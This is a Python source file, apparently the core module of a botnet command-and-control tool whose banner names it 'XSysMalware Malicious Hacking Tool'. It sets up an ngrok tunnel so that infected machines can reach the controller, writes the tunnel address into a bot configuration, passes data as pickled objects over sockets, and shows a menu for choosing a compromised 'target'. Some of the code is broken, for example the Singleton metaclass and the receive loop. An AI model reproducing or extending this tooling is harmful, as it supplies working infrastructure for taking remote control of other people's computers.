import os
import string
import sys
import platform
import json
import pickle
import time
import random
import hashlib
from string import punctuation, whitespace, ascii_letters
from pyngrok import ngrok, conf
from socket import socket, error, timeout, AF_INET, SOCK_STREAM
from typing import Any
from dataclasses import dataclass, asdict
from base64 import b64encode, b64decode
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES


class Singleton(type):
    instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls.instances:
            cls.instances[cls] = cls
        return cls


class CryptoUtils(object, metaclass=Singleton):

    new = lambda s: AES.new(s.encode(), AES.MODE_ECB)

    encode_aes = lambda c, s: c.encrypt(pad(b64encode(s.encode()), AES.block_size))
    decode_aes = lambda c, e: b64decode(unpad(c.decrypt(e), AES.block_size)).decode()


class Config(object, metaclass=Singleton):

    @staticmethod
    def get_ngrok_binary():
        if platform.platform().lower().startswith('win'):
            binary = Config.resource_path('bin/ngrok.exe')
        else:
            binary = Config.resource_path('bin/ngrok')
        return binary

    @staticmethod
    def resource_path(relative_path):
        """ Get absolute path to resource, works for dev and for PyInstaller """
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        else:
            base_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..')
        return os.path.join(base_path, relative_path)

    @staticmethod
    def get_config_path():
        return Config.resource_path('config.json')

    @staticmethod
    def get_bot_config():
        return Config.resource_path('bot.json')

    @staticmethod
    def load_config(service=None):
        if not service:
            config_json = Config.resource_path('config.json')
        else:
            config_json = Config.resource_path('bot.json')
        with open(config_json, 'r') as stream:
            data = json.load(stream)
            stream.close()
        return data


class BotnetSocket(socket):
    """
    class: BotnetSocket (socket)
    this class represents a wrapped socket.socket() object
    which is responsible to operate as a communication interface
    and transmit data between endpoints.
    """
    def __init__(self, *args, **kwargs):
        super(BotnetSocket, self).__init__(*args, **kwargs)


class BotnetInterface(object):
    """
    class: BotnetInterface (object)
    this class represents the scope interface of which a BOTNET network
    interacts interacts according to Admin's class requirements.
    """
    incoming = None
    outgoing = None
    tunnel = None
    config = None

    def __init__(self, insocket: socket = None, outsocket: socket = None, self_type: str = None):
        if isinstance(insocket, socket):
            self.incoming = insocket
        else:
            self.incoming = socket()

        if isinstance(outsocket, socket):
            self.outgoing = outsocket
        else:
            self.outgoing = socket()
        self.config = Config.load_config(self_type)

    def populate(self): self.config = Config.load_config('bot')

    def distribute(self):
        bin_path = Config.get_ngrok_binary()
        tunnel = self.config.get('tunnel')
        incoming = self.config.get('incoming')
        pyngrok_config = conf.PyngrokConfig(ngrok_path=bin_path)
        self.tunnel = ngrok.connect(incoming.get('port'), tunnel.get('proto'), pyngrok_config=pyngrok_config)
        with open(Config.get_config_path(), 'r') as stream_read:
            data_read = json.load(stream_read)
            url, port = self.tunnel.public_url.split('://').pop().split(':')
            data_read.get('tunnel')['url'] = url
            data_read.get('tunnel')['port'] = int(port)
            data_write = data_read
            with open(Config.get_config_path(), 'w') as stream_write:
                stream_write.write(json.dumps(data_write))
                stream_write.close()
            stream_read.close()
        self.config = Config.load_config()
        with open(Config.get_bot_config(), 'w') as stream_write:
            data = json.dumps({
                "tunnel": self.config.get("tunnel"),
                "settings": self.config.get("settings")
            })
            stream_write.write(data)
            stream_write.close()

    def accept(self): return self.incoming.accept()

    def connect(self, _address: tuple):
        try:
            self.outgoing.connect(_address)
        except error as e:
            return e
        return True

    def bind(self, _address: tuple): self.incoming.bind(_address)

    def listen(self, _backlog: int): self.incoming.listen(_backlog)

    def send(self, data: Any, connection=None):
        connection = self.outgoing if not connection else connection
        data = pickle.dumps(data)
        connection.sendall(data)

    def receive(self, connection=None):
        connection = self.outgoing if not connection else connection
        data = b''
        pkt = connection.recv(self.config.get('settings').get('buffer'))
        while pkt:
            data += pkt
            if data != b'':
                break
            pkt = connection.recv(self.config.get('settings').get('buffer'))
        data = pickle.loads(data)
        return data


@dataclass
class Envelope(object):
    """
    class: Envelope (object)
    this class represents the data structure for
    which a socket endpoint transmit among the Flux Network.
    """
    Id: str
    DataText: str

    def __init__(self, data=None):
        self.Id = hex(id(data))
        self.DataText = data

    def __repr__(self):
        return '<Envelope %r>' % asdict(self)


@dataclass
class Peer(object):
    """
    class: Peer (object)
    this class represents the connection data for
    which a socket is connected to an endpoint.
    """
    Id: str
    Socket: socket
    Address: tuple
    online: bool

    def __init__(self, peer_id=None, peer=None, address=None, online=False):
        self.Id = peer_id
        self.Socket = peer
        self.Address = address
        self.online = online

    def __repr__(self):
        return '<Peer %r>' % asdict(self)


class Menu(object, metaclass=Singleton):

    @staticmethod
    def clear_console():
        os.system('cls') if platform.platform().lower().startswith('win') else os.system('clear')

    @staticmethod
    def welcome():
        Menu.clear_console()
        print('\n')
        print('''
[==================================================]
[  Welcome To XSysMalware  Malicious Hacking Tool  ]
[==================================================] 
[               Version Alpha 1.0.0-1              ]
[  ----------------------------------------------  ] 
[            Created -by- T0x1cEnv31ope            ]   
[==================================================]''')

    @staticmethod
    def refresh_connections_list(connection: dict):
        Menu.clear_console()
        print('''[==================================================]
[    Listing all available connections in pool     ] 
[==================================================]
[#]============[REMOTE ADDRESS]============[PEER ID]''')
        for i, (key, peer) in enumerate(connection.items()):
            peer_id = peer.Id or key
            ip, port = peer.Address
            print('[%d]             %s:%d            %s' % ((i+1), ip, port, peer_id[:8]))
        return Menu.choose_from_connections(connection)

    @staticmethod
    def choose_from_connections(connections: dict):
        if len(connections.keys()) == 0:
            print('[!] No connections!')
            time.sleep(5)
            return
        else:
            print('\n--------\n[!] Enter `0` to exit')
            choice = input('[$] select a  target:\n ')
            if choice in [punctuation, whitespace, ascii_letters]:
                print('[!] unsupported choice %s' % choice)
                time.sleep(5)
                return Menu.refresh_connections_list(connections)
            elif choice == '0':
                return
            else:
                try:
                    choice = connections.get(list(connections.keys())[int(choice) - 1])
                except IndexError:
                    print('[!] target id  %d doesn\'t exists!')
                    time.sleep(5)
                    return Menu.refresh_connections_list(connections)
        return choice

    @staticmethod
    def refresh(self):
        print("\n")
        print("[*] ngrok tunnel %s is running" % self.interface.tunnel.public_url)
        print("[*] tcp socket is online")
        print('[*] waiting for incoming connections (up to %d)\n' % self.config.get('incoming').get('backlog'))
